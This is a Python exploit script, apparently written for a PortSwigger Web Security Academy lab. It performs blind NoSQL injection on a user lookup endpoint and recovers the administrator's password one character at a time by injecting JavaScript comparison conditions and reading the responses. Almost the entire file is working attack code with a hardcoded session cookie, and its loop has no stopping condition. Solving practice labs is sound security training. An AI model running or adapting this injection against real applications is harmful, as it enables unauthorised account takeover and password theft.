import string
import requests
from pwn import *

class Exploit:

    def __init__(self):

        self.host = "https://0a0b00ee036934c0823e66bb00e80076.web-security-academy.net"
        self.api = "/user/lookup?user="
        self.characters = string.ascii_letters + string.digits
        self.headers = {"Cookie":"session=u2yGDLCdBSCvRhafeusdJujvxnviEN0b"}
        self.p2 = log.progress("Payload")
        self.p1 = log.progress("NOSQL Injection")

    def nosqli(self):

        # primera letra es una 's'
        pos = 0
        content = ""
        while True:
            self.p1.status(content)

            for char in self.characters:

                payload = f"administrator'+%26%26+this.password[{pos}]+==+'{char}'+%26%26+'1'=='1"
                self.p2.status(payload)
            
                r = requests.get(self.host+self.api+payload, headers=self.headers)
                if "Could not find user" not in r.text:
                    content+=char
                    pos+=1
                    break


if __name__ == "__main__":

    exploit = Exploit()
    exploit.nosqli()


        